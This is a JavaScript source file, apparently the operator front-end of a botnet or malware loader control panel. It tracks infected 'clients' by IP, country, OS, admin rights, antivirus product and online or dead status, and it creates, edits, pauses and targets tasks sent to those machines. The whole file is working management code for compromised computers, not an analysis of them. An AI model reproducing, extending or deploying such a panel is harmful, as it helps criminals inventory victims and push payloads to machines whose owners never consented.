var defaultTheme = 'dark';
var currentTheme = '';
initTheme();
var tasksTable = {};
var clientsTable = {};

$(function() {
	$('a[data-toggle="tab"]').on('click', function(e) {
		localStorage.setItem('activeTab', $(e.currentTarget).attr('id'));
	});
	
	var activeTab = localStorage.getItem('activeTab');
	if ((activeTab == 'undefined') || (!activeTab)) {
		activeTab = $('a[aria-selected=true]').attr('id');
		$('a[id="' + activeTab + '"]').addClass('active');
		localStorage.setItem('activeTab', activeTab);
		console.log('tab undefined');
	}

	$('a[id="' + activeTab + '"]').tab('show');
	switch (activeTab) {
		case 'nav-dashboard-tab':
			dashboardLoad();
			break;
		case 'nav-clients-tab':
			clientsLoad();
			break;
		case 'nav-tasks-tab':
			tasksLoad();
			break;
		case 'nav-settings-tab':
			settingsLoad();
			break;
        case 'nav-users-tab':
			usersLoad();
			break;
		default:
			dashboardLoad();
			break;
	};
}); 

function dashboardLoad() {
	$('#nav-dashboard').load("./pages/dashboard.php", function() {
        
        $.ajax({
            type: "POST",
            url: "./server/printSummaryOverview.php",
            success: function(data){
                var dataJson = JSON.parse(data);
                console.log(data);
                $('#online').text(dataJson['online']);
                $('#dead').text(dataJson['dead']);
                $('#onlineToday').text(dataJson['onlineToday']);
                $('#newToday').text(dataJson['newToday']);
                $('#onlineWeek').text(dataJson['onlineWeek']);
                $('#newWeek').text(dataJson['newWeek']); 
                $('#onlineMonth').text(dataJson['onlineMonth']);
                $('#newMonth').text(dataJson['newMonth']);
            }
        });
        
        $.ajax({
            type: "POST",
            url: "./server/drawWorldMap.php",
            success: function(data){
                var areas = JSON.parse(data);
                $(".mapcontainer").mapael({
                    map: {
                        name: "world_countries",
                        defaultArea: {
                            attrs: {
                                stroke: "#2b2d2e",
                                fill: "#343638",
                                "stroke-width": 1
                            },
                            attrsHover: {
                                "stroke-width": 2
                            }
                        }
                    },
                    legend: {
                        area: {
                            mode: 'horizontal',
                            labelAttrs: {
                                "font-size": 12,
                                "font-family": "Circular",
                                fill: "#88939C"
                            },
                            slices: [{
                                    max: 25,
                                    attrs: {
                                        fill: "#0ffcb5"
                                    },
                                    label: "< 25"
                                }, {
                                    min: 25,
                                    max: 50,
                                    attrs: {
                                        fill: "#00bb83"
                                    },
                                    label: "25 - 50"
                                }, {
                                    min: 50,
                                    max: 100,
                                    attrs: {
                                        fill: "#48d13f"
                                    },
                                    label: "50 - 100"
                                }, {
                                    min: 100,
                                    max: 200,
                                    attrs: {
                                        fill: "#00aad5"
                                    },
                                    label: "100 - 200"
                                }, {
                                    min: 150,
                                    max: 200,
                                    attrs: {
                                        fill: "#0079b5"
                                    },
                                    label: "150 - 200"
                                }, {
                                    min: 200,
                                    max: 250,
                                    attrs: {
                                        fill: "#ed0000"
                                    },
                                    label: "200 - 250"
                                }, {
                                    min: 250,
                                    attrs: {
                                        fill: "#870000"
                                    },
                                    label: "> 250"
                                }
                            ]
                        }
                    },
                    areas: areas
                });
            }
         });

		Chart.defaults.global.defaultFontFamily = "Circular";
		// Chart.defaults.global.defaultFontSize = 18;
		
        $.ajax({
            type: "POST",
            url: "./server/drawSystemsChart.php",
            success: function(data){
                var dataJson = JSON.parse(data);
                var labels = dataJson.data.map(function(e) {
                   return e.name;
                });
                var data = dataJson.data.map(function(e) {
                   return e.count;
                });
                
                var osChartCanvas = $('#osChart');
                var pieChart = new Chart(osChartCanvas, {
                    type: 'doughnut',
                    data: {
                        datasets: [{
                            data: data,
                            backgroundColor: [
                                "#5899DA",
                                "#E8743B",
                                "#19A979",
                                "#ED4A7B",
                                "#945ECF",
                                "#13A4B4",
                                "#525DF4",
                                "#BF399E",
                                "#6C8893",
                                "#EE6868",
                                "#2F6497",
                                "#930a0a",
                                "#a4650a",
                                "#2a6d3c",
                                "#596468",
                                "#1866b4",
                                "#cc4300",
                                "#03734d",
                                "#596468"
                            ],
                            borderColor: "#424242"
                        }],
                        labels: labels
                    },
                    options: {
                        responsive: true,
                        legend: {
                            display: false
                        }
                    }
                });
            }
         });

		$.ajax({
            type: "POST",
            url: "./server/drawRightsChart.php",
            success: function(data){
                var dataJson = JSON.parse(data);
                var labels = dataJson.data.map(function(e) {
                   return e.name;
                });
                var data = dataJson.data.map(function(e) {
                   return e.count;
                });
                
                var rightsChartCanvas = $('#rightsChart');
                var pieChart = new Chart(rightsChartCanvas, {
                    type: 'doughnut',
                    data: {
                        datasets: [{
                            data: data,
                            backgroundColor: [
                                "#74abe2",
                                "#3fa45b",
                                "#9ea8ad"
                            ],
                        borderColor: "#424242"
                        }],
                        labels: labels
                    },
                    options: {
                        responsive: true,
                        legend: {
                            display: false
                        }
                    }
                });
            }
         });
		
        $.ajax({
            type: "POST",
            url: "./server/drawAntivirusesChart.php",
            success: function(data){
                var dataJson = JSON.parse(data);
                var labels = dataJson.data.map(function(e) {
                   return e.name;
                });
                var data = dataJson.data.map(function(e) {
                   return e.count;
                });
                
                var avChartCanvas = $('#avChart');
                var pieChart = new Chart(avChartCanvas, {
                    type: 'doughnut',
                    data: {
                        datasets: [{
                            data: data,
                            backgroundColor: [
                                "#a8b800",
                                "#59bd39",
                                "#00bd6d",
                                "#00b8a4",
                                "#00b1d6",
                                "#00a5fc",
                                "#0093ff",
                                "#0d7aff"
                            ],
                        borderColor: "#424242"
                        }],
                        labels: labels
                    },
                    options: {
                        responsive: true,
                        legend: {
                            display: false
                        }
                    }
                });
            }
         });
        
		$.ajax({
            type: "POST",
            url: "./server/drawVersionsChart.php",
            success: function(data){
                var dataJson = JSON.parse(data);
                var labels = dataJson.data.map(function(e) {
                   return e.name;
                });
                var data = dataJson.data.map(function(e) {
                   return e.count;
                });
                
                var verChartCanvas = $('#verChart');
                var pieChart = new Chart(verChartCanvas, {
                    type: 'doughnut',
                    data: {
                        datasets: [{
                            data: data,
                            backgroundColor: [
                                "#fcc3a7",
                                "#f5aa85",
                                "#ef8d5d",
                                "#E8743B",
                                "#da5a1b",
                                "#cc4300"
                            ],
                        borderColor: "#424242"
                        }],
                        labels: labels
                    },
                    options: {
                        responsive: true,
                        legend: {
                            display: false
                        }
                    }
                });
            }
         });
		
        $('#topOSTable').DataTable({
            "searching": false,
            "info": false,
            "paging": false,
            "order": [ 1, 'desc' ],
            "ajax": "./server/printTopSystems.php",
            "autoWidth": true,
            "stateSave": true,
            "deferRender": true,
            "initComplete": function() {
                $('.dataTables_wrapper').fadeIn(700);
            }
        });
		
        $('#topCountriesTable').DataTable({
            "searching": false,
            "info": false,
            "paging": false,
            "order": [ 1, 'desc' ],
            "ajax": "./server/printTopCountries.php",
            "columnDefs": [
                {
				    "render": function ( data, type, row ) {
				        return '<img src="https://www.countryflags.io/' + data + '/flat/64.png" style="width: 17px" title="' + data + '">  ' + data;
				    },
				    "targets": 0
				}
            ],
            "autoWidth": true,
            "stateSave": true,
            "deferRender": true,
            "initComplete": function() {
				$('.dataTables_wrapper').fadeIn(700);
            }
		 });
		
        $('#topAVTable').DataTable({
            "searching": false,
            "info": false,
            "paging": false,
            "order": [ 1, 'desc' ],
            "ajax": "./server/printTopAntiviruses.php",
            "autoWidth": true,
            "stateSave": true,
            "deferRender": true,
            "initComplete": function() {
				$('.dataTables_wrapper').fadeIn(700);
            }
        });
	});
};
function clientsLoad() {
	$('.dataTables_wrapper').fadeOut(100);
	$('#nav-clients').load("./pages/clients.php", function() {
		
	clientsTable = $('#clientsTable').DataTable({
		"processing": true,
		"serverSide": true,
		"ajax": {
			url :"./server/printClients.php", // json datasource
			type: "POST",  // type of method , by default would be get
			error: function(xhr, error, code){  // error handling code
				$("#clientsTable_processing").css("display","none");
				console.log(xhr);
				console.log(code);
				console.log(error);
				
			}
		},
		"columns": [
			{ "data": 'id' },
			{ "data": 'ip' },
			{ "data": 'location' },
			{ "data": 'os' },
			{ "data": 'role' },
			{ "data": 'antivirus' },
			{ "data": 'ram' },
			{ "data": 'storage' },
			{ "data": 'network' },
			{ "data": 'added' },
			{ "data": 'seen' },
			{ "data": 'version' },
			{
					"className": 'details-control',
					"orderable": false,
					"data": null,
					"defaultContent": '<i class="fad fa-info"></i>'
			},
            {
					"className": 'addtask-control',
					"orderable": false,
					"data": null,
					"defaultContent": '<i class="fad fa-user-edit"></i>'
			},
            {
					"className": 'delete-control',
					"orderable": false,
					"data": null,
					"defaultContent": '<i class="fad fa-trash"></i>'
			}
		],
		"columnDefs": [
			{
				"targets": 2,
				"render": function ( data, type, row ) {
					return '<img src="https://www.countryflags.io/' + data + '/flat/64.png" style="height: 18px" title="' + data + '">';
				}
			},
            {
				"targets": 9,
				"render": function ( data, type, row ) {
					var addedDate = new Date(Date.parse(data));
				    return addedDate.toLocaleString('ru-RU');
				}
			},
			{
				"targets": 10,
				"render": function ( data, type, row ) {
					var seenDate = new Date(Date.parse(data));
					var currentDate = new Date().toLocaleString('en-US', {timeZone: "Europe/Moscow"});
                    currentDate = new Date(currentDate);

					var difference = currentDate - seenDate; // Difference in ms
					difference = difference / 60000; // Difference in min

					if (difference < 5)
						return '<span class="badge badge-pill badge-success" title="' + seenDate.toLocaleString('ru-RU') + '">Online</span>';
					else if (difference < 5760)
						return '<span class="badge badge-pill badge-secondary" title="' + seenDate.toLocaleString('ru-RU') + '">Offline</span>';
                    else
                        return '<span class="badge badge-pill badge-danger" title="' + seenDate.toLocaleString('ru-RU') + '">Dead</span>';
				}
			}
		],
		"autoWidth": true,
		"stateSave": true,
		"deferRender": true,
		"initComplete": function() {
			$('.dataTables_wrapper').fadeIn(200);
		},
		"lengthMenu": [[ 50, 100, 150, 200, 300, 400, 500, -1 ], [ 50, 100, 150, 200, 300, 400, 500, 'Show all' ]]
	});
		
	$('#clientsTable tbody').on('click', 'td.details-control', function () {
		var tr = $(this).closest('tr');
		var row = clientsTable.row( tr );
 
		if ( row.child.isShown() ) {
			// This row is already open - close it
			row.child.hide();
			tr.removeClass('shown');
		}
		else {
			// Open this row
			row.child( formatClientDetails(row.data()) ).show();
			tr.addClass('shown');
		}
	});
    $('#clientsTable tbody').on('click', 'td.addtask-control', function () {
        console.log('addtask clicked');
        
		var tr = $(this).closest('tr');
		var row = clientsTable.row( tr );
		var clientID = tr.find("td:eq(0)").html();
        console.log(clientID);
        
        $('.createTask-modal').modal('show');
        $('#collapseCustomTargets').collapse("show");
        $('[name="target"]')
            .removeAttr('checked')
            .filter('[value="Custom"]')
                .attr('checked', true);
        $('[name="client_id"]').attr('value', clientID);
	});
    $('#clientsTable tbody').on('click', 'td.delete-control', function () {
		var tr = $(this).closest('tr');
		var row = clientsTable.row( tr );
		var clientID = tr.find("td:eq(0)").html();
		$.ajax({
			url: './server/removeClient.php',
			type: 'POST',
			data: { id:clientID },
			success: function(response){
				clientsTable.ajax.reload();
			}
		});
	});
		
	function formatClientDetails ( d ) {
		// `d` is the original data object for the row
		console.log(d);
		return '<table cellpadding="5" cellspacing="0" border="0" style="padding-left:50px;">'+
			'<tr>'+
				'<td>UUID:</td>'+
				'<td>'+d['uuid']+'</td>'+
			'</tr>'+
			'<tr>'+
				'<td>CPU:</td>'+
				'<td>'+d['cpu']+'</td>'+
			'</tr>'+
			'<tr>'+
				'<td>PC:</td>'+
				'<td>'+d['user']+'</td>'+
			'</tr>'+
		'</table>';
		}
	// });
		
	});
};
function tasksLoad() {
	$('.dataTables_wrapper').fadeOut(100);
	$('#nav-tasks').load("./pages/tasks.php", function() {
	tasksTable = $('#tasksTable').DataTable({
		"info": false,
		"paging": false,
		"searching": false,
		"processing": true,
		"serverSide": true,
		"ajax": {
			url :"./server/printTasks.php", // json datasource
			type: "POST",  // type of method , by default would be get
			error: function(xhr, error, code){  // error handling code
				$("#tasksTable_processing").css("display","none");
				console.log(xhr);
				console.log(code);
				console.log(error);
			}
		},
		"columns": [
				{ "data": 'id' },
				{ "data": 'title' },
				{ "data": 'type' },
				{ "data": 'content' },
				{ "data": 'target' },
				{ "data": 'trigger' },
				{ "data": 'total_done' },
				{ "data": 'total_failed' },
				{ "data": 'added' },
				{ "data": 'status' },
				{
					"className": 'details-control',
					"orderable": false,
					"data": null,
					"defaultContent": '<i class="fad fa-info fa-lg"></i>'
				},
                {
					"className": 'edit-control',
					"orderable": false,
					"data": null,
					"defaultContent": '<i class="fad fa-edit fa-lg"></i>'
				},
                {
					"className": 'pause-control',
					"orderable": false,
					"data": null,
					"defaultContent": '<i class="fad fa-pause fa-lg"></i>'
				},
				{
					"className": 'delete-control',
					"orderable": false,
					"data": null,
					"defaultContent": '<i class="fad fa-trash fa-lg"></i>'
				}
		],
		"columnDefs": [
			{
				"targets": 9,
				"render": function ( data, type, row ) {
					if (data == 'Active')
                        return '<span class="badge badge-pill badge-success">' + data + '</span>';
                    if (data == 'Paused')
                        return '<span class="badge badge-pill badge-secondary">' + data + '</span>';
				}
			},
            {
                "targets": 12,
				"render": function ( data, type, row ) {
					if (row['status'] == 'Active')
						return '<i class="fad fa-pause fa-lg"></i>';
					if (row['status'] == 'Paused')
						return '<i class="fad fa-play fa-lg"></i>';
				}
            }
		],
		"autoWidth": true,
		"stateSave": true,
		"deferRender": true,
		"initComplete": function() {
			$('.dataTables_wrapper').fadeIn(200);
		}
	});
		
	$('#tasksTable tbody').on('click', 'td.details-control', function () {
		var tr = $(this).closest('tr');
		var row = tasksTable.row( tr );
 
		if ( row.child.isShown() ) {
			// This row is already open - close it
			row.child.hide();
			tr.removeClass('shown');
		}
		else {
			// Open this row
			row.child( formatTaskDetails(row.data()) ).show();
			tr.addClass('shown');
		}
	} );
        
//  Edit Task
    $('#tasksTable tbody').on('click', 'td.edit-control', function () {
		var tr = $(this).closest('tr');
		var row = tasksTable.row( tr );
		var taskID = tr.find("td:eq(0)").html();
        $.ajax({
			url: './server/getTaskInfo.php',
			type: 'POST',
			data: { id:taskID },
			success: function(response){
                taskInfo = jQuery.parseJSON(response);
                $('[name="editTaskID"]').attr('value', taskInfo[0]['id']);
                $('[name="editTitle"]').attr('value', taskInfo[0]['title']);
                $('[name="editType"] option')
                    .removeAttr('selected')
                    .filter('[value="' + taskInfo[0]["type"] + '"]')
                        .attr('selected', true);
                $('[name="editContent"]').attr('value', taskInfo[0]['content']);
                $('[name="editTarget"]')
                    .removeAttr('checked')
                    .filter('[value="' + taskInfo[0]["target"] + '"]')
                        .attr('checked', true);
                if (taskInfo[0]['target'] == 'All') {
                    $('#editCollapseCustomTargets').collapse("hide");
                } else {
                    $('#editCollapseCustomTargets').collapse("show");
                    if (taskInfo[0]['limit'] != -1)
                        $('[name="editLimit"]').attr('value', taskInfo[0]['limit']);
                    if (taskInfo[0]['client_id'] != -1)
                        $('[name="editClient_id"]').attr('value', taskInfo[0]['client_id']);
                    if (taskInfo[0]['location'] != -1)
                        $('[name="editLocation"]').attr('value', taskInfo[0]['location']);
                    if (taskInfo[0]['os'] != -1)
                        $('[name="editOs"]').attr('value', taskInfo[0]['os']);
                    if (taskInfo[0]['antivirus'] != -1)
                        $('[name="editAntivirus"]').attr('value', taskInfo[0]['antivirus']);
                    if (taskInfo[0]['storage_type'] != -1) {
                        $('[name="editStorage_type"] option')
                            .removeAttr('selected')
                            .filter('[value="' + taskInfo[0]["storage_type"] + '"]')
                                .attr('selected', true);
                    }
                    if (taskInfo[0]['storage'] != -1)
                        $('[name="editStorage"]').attr('value', taskInfo[0]['storage']);
                    if (taskInfo[0]['network_type'] != -1) {
                        $('[name="editNetwork_type"] option')
                            .removeAttr('selected')
                            .filter('[value="' + taskInfo[0]["network_type"] + '"]')
                                .attr('selected', true);
                    }
                    if (taskInfo[0]['network'] != -1)
                        $('[name="editNetwork"]').attr('value', taskInfo[0]['network']);
                    
                }
                $('[name="editTrigger"]')
                    .removeAttr('checked')
                    .filter('[value="' + taskInfo[0]["trigger"] + '"]')
                        .attr('checked', true);
                $('[name="editStatus"] option')
                    .removeAttr('selected')
                    .filter('[value="' + taskInfo[0]["status"] + '"]')
                        .attr('selected', true);
			}
		});
        $('.editTask-modal').modal('show');
	});
    
    $('#tasksTable tbody').on('click', 'td.pause-control', function () {
		var tr = $(this).closest('tr');
		var taskID = tr.find("td:eq(0)").html();
		$.ajax({
			url: './server/pauseTask.php',
			type: 'POST',
			data: { id:taskID },
			success: function(response){
                tasksTable.ajax.reload();
			}
		});
	});    
    
//  Delete Task
	$('#tasksTable tbody').on('click', 'td.delete-control', function () {
		var tr = $(this).closest('tr');
		var taskID = tr.find("td:eq(0)").html();
		$.ajax({
			url: './server/removeTask.php',
			type: 'POST',
			data: { id:taskID },
			success: function(response){
				tasksTable.ajax.reload();
			}
		});
	});

	function formatTaskDetails ( d ) {
		var limit, clientID, location, os, av, storage, network;
		if (d['limit'] == -1)
			limit = 'Unlimited';
		else limit = d['limit'];
		if (d['client_id'] == '-1')
			clientID = 'All';
		else clientID = d['client_id'];
		if (d['location'] == '-1')
			location = 'All';
		else location = d['location'];
		if (d['os'] == '-1')
			os = 'All';
		else os = d['os'];
		if (d['storage'] == '-1')
			storage = 'All';
		else storage = d['storage_type'] + ' ' + d['storage'];
		if (d['network'] == '-1')
			network = 'All';
		else network = d['network_type'] + ' ' + d['network'];
		// `d` is the original data object for the row
		return '<table>'+
			'<tr>'+
				'<td>Limit:</td>'+
				'<td>'+limit+'</td>'+
				'<td>Client ID:</td>'+
				'<td>'+clientID+'</td>'+
			'</tr>'+
			'<tr>'+
				'<td>Location:</td>'+
				'<td>'+location+'</td>'+
				'<td>OS:</td>'+
				'<td>'+os+'</td>'+
				
			'</tr>'+
			'<tr>'+
				'<td>Storage:</td>'+
				'<td>'+storage+'</td>'+
				'<td>Network:</td>'+
				'<td>'+network+'</td>'+
			'</tr>'+
		'</table>';
	}
		
		
		// $(document).on('submit', '#my-form', function() {
      // var createTaskFormElement = document.querySelector("#createTaskForm");
			// var request = new XMLHttpRequest();
			// request.open("POST", "./server/addTask.php");
			// request.send(new FormData(createTaskFormElement));
      // return false;
     // });
	});
};
function settingsLoad() {
	$('#nav-settings').load('./pages/settings.php', function() {
		indicateTheme(localStorage.getItem('theme'));
	});
};
function usersLoad() {
	$('.dataTables_wrapper').fadeOut(100);
	$('#nav-users').load("./pages/users.php", function() {
        console.log('load page');
        usersTable = $('#usersTable').DataTable({
            "info": false,
		    "paging": false,
		    "searching": false,
            "processing": true,
            "serverSide": true,
            "ajax": {
                url :"./server/printUsers.php", // json datasource
                type: "POST",  // type of method , by default would be get
                error: function(xhr, error, code){  // error handling code
                    $("#usersTable_processing").css("display","none");
                    console.log(xhr);
                    console.log(code);
                    console.log(error);

                }
            },
            "columns": [
                { "data": 'id' },
                { "data": 'login' },
                { "data": 'role' },
                {
                    "className": 'details-control',
                    "orderable": false,
                    "data": null,
                    "defaultContent": '<i class="fad fa-edit fa-lg"></i>'
                }
            ],
            "autoWidth": true,
            "stateSave": true,
            "deferRender": true,
            "initComplete": function() {
                $('.dataTables_wrapper').fadeIn(200);
            }
        });
    });
};

function logoutLoad() {
	document.location.href = './server/logout.php';
};

function initTheme() {
	currentTheme = localStorage.getItem('theme');
	switch(currentTheme) {
		case null:
			document.documentElement.setAttribute('theme', defaultTheme);
			localStorage.setItem('theme', defaultTheme);
			break;
		case 'dark':
			document.documentElement.setAttribute('theme', 'dark');
			localStorage.setItem('theme', 'dark');
			break;
		case 'light':
			document.documentElement.setAttribute('theme', 'light');
			localStorage.setItem('theme', 'light');
			break;
		default:
			break;
	};
}

function setTheme(e) {
	var setValue = e.target.value;
	if (setValue == 'auto') {
			localStorage.removeItem('theme');
	}
	else {
			localStorage.setItem('theme', setValue);
	}
	
	document.documentElement.setAttribute('theme', setValue);
}

function indicateTheme(appearance) {
	var colorScheme = document.getElementsByName('colorScheme');
	for(var i = colorScheme.length; i--; ) {
			if(colorScheme[i].value == appearance) {
					colorScheme[i].checked = true;
			}
	};
	for(var i = colorScheme.length; i--; ) {
		colorScheme[i].onclick = setTheme;
	}
}

$('.createTask-modal').submit(function(e){
    $('.createTask-modal').modal('hide');
    e.preventDefault();
    
    var createTaskForm = document.querySelector("#createTaskForm");
    var request = new XMLHttpRequest();
    request.open("POST", "./server/addTask.php");
    request.send(new FormData(createTaskForm));
    tasksTable.ajax.reload();
    
    return false;
});

function createUser() {
    $('.createUser-modal').modal('hide');
    var createUserForm = document.querySelector("#createUserForm");
    var request = new XMLHttpRequest();
    request.open("POST", "./server/addUser.php");
    request.send(new FormData(createUserForm));
    usersTable.ajax.reload();
}

function deleteDead() {
    var request = new XMLHttpRequest();
    request.open("POST", "./server/deleteDead.php");
    request.send();
}

function changePassword() {
	$('#changePasswordForm').submit(function(e){
        e.preventDefault();
        var changePasswordForm = document.querySelector("#changePasswordForm");
        console.log(changePasswordForm);
        var request = new XMLHttpRequest();
        request.open("POST", "./server/changePassword.php");
        request.send(new FormData(changePasswordForm));
    });
}

function editTask() {
	var editTaskForm = document.querySelector("#editTaskForm");
	console.log(createTaskForm);
	var request = new XMLHttpRequest();
	request.open("POST", "./server/editTask.php");
	request.send(new FormData(editTaskForm));
	$('.editTask-modal').modal('hide');
	tasksTable.ajax.reload();
}